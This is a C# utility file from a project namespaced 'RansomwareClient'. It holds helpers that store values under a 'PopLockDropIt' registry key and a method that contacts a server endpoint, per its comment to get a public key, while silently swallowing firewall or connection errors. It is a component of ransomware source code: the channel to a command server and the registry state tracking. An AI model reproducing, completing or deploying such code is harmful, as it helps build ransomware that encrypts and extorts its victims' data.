using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace RansomwareClient
{
    public class Utility
    {
        public static void SetRegistryKeyValuePair(string key, string value, bool testIfExists = false)
        {
            using (var regkey = Registry.CurrentUser.CreateSubKey("PopLockDropIt"))
            {
                if (testIfExists && regkey.GetValue(key) != null) return;
                regkey.SetValue(key, value);
            }
        }
        public static string GetRegistryValue(string key)
        {
            using (var regkey = Registry.CurrentUser.CreateSubKey("PopLockDropIt"))
            {
                return regkey.GetValue(key).ToString();
            }
        }
        public static string RequestFromServer(string route, byte[] body = null)
        {
            //make request to the server to get a public key
            var request = (HttpWebRequest)WebRequest.Create($"{App.SERVER_ENDPOINT}/{route}");
            request.AutomaticDecompression = DecompressionMethods.GZip;
            if (body != null)
            {
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = body.Length;
                using (var stream = request.GetRequestStream())
                {
                    stream.Write(body, 0, body.Length);
                }
            }
            try
            {
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (var stream = response.GetResponseStream())
                using (var reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (WebException){ }  //filtered/blocked/serverdown e.g. firewall
            return string.Empty;

        }
    }
}
